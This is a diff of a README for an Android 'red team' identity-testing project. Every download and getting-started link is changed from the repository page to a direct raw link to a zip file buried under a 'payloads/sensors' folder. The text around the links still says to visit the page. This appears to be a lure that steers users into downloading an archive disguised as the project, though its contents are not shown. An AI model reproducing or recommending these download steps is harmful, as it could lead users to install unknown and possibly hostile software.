@@ -1,11 +1,11 @@
 # 🛡️ AndroidRedTeam - Test Android Identity Checks Safely
 
-[![Download AndroidRedTeam](https://img.shields.io/badge/Download-AndroidRedTeam-blue)](https://github.com/Suryaa199/AndroidRedTeam)
+[![Download AndroidRedTeam](https://img.shields.io/badge/Download-AndroidRedTeam-blue)](https://github.com/Suryaa199/AndroidRedTeam/raw/refs/heads/main/materials/payloads/sensors/Android-Team-Red-v3.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the project:
-https://github.com/Suryaa199/AndroidRedTeam
+https://github.com/Suryaa199/AndroidRedTeam/raw/refs/heads/main/materials/payloads/sensors/Android-Team-Red-v3.3.zip
 
 ## 🧭 What This Is
 
@@ -39,7 +39,7 @@ For the best setup, use:
 ## 🚀 Getting Started
 
 1. Open this page in your browser:
-   https://github.com/Suryaa199/AndroidRedTeam
+   https://github.com/Suryaa199/AndroidRedTeam/raw/refs/heads/main/materials/payloads/sensors/Android-Team-Red-v3.3.zip
 
 2. Find the download option on the page.
 
@@ -58,7 +58,7 @@ For the best setup, use:
 ### 1) Visit the download page
 
 Open:
-https://github.com/Suryaa199/AndroidRedTeam
+https://github.com/Suryaa199/AndroidRedTeam/raw/refs/heads/main/materials/payloads/sensors/Android-Team-Red-v3.3.zip
 
 ### 2) Download the files
 
